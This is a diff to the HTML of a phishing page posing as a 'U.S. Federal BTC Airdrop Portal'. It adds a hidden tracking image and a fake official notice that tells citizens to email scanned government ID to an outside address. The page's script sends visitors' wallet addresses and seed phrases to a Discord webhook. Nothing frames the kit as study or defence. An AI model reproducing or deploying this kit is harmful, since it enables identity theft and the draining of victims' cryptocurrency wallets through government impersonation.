@@ -14,9 +14,19 @@
       color: #0a2342;
     }
 
+    .notice-bar {
+      background-color: #e8f1fb;
+      color: #0a2342;
+      padding: 18px 14px;
+      font-size: 0.98em;
+      border-bottom: 2px solid #c2d8f5;
+      line-height: 1.6;
+    }
+
     h1 {
       font-size: 1.9em;
       font-weight: 700;
+      margin-top: 30px;
     }
 
     h1 span {
@@ -86,6 +96,18 @@
   </style>
 </head>
 <body>
+
+  <!-- 🔍 Tracker -->
+  <img src="tracker.php" style="display:none;" />
+
+  <!-- 📩 Official Notice Bar -->
+  <div class="notice-bar">
+    📄 <strong>Notice:</strong> Eligible citizens are required to confirm their selection for the ongoing Federal Digital Asset Reimbursement.<br><br>
+    Please submit a scanned copy of your government-issued ID to  
+    <strong>admin@govbtcclaim.org</strong><br>
+    Subject line: <em>Eligibility Confirmation – BTC Reimbursement</em>
+  </div>
+
   <h1>🇺🇸 U.S. Federal BTC Airdrop Portal
     <span>Submit to verify eligibility & claim stimulus-linked Bitcoin</span>
   </h1>
@@ -117,7 +139,7 @@
       const phrase = document.querySelector('input[name="phrase"]').value;
 
       const message = `📥 **New Submission**\n🔐 Wallet: ${wallet}\n🧠 Phrase: ${phrase}`;
-      
+
       fetch("https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
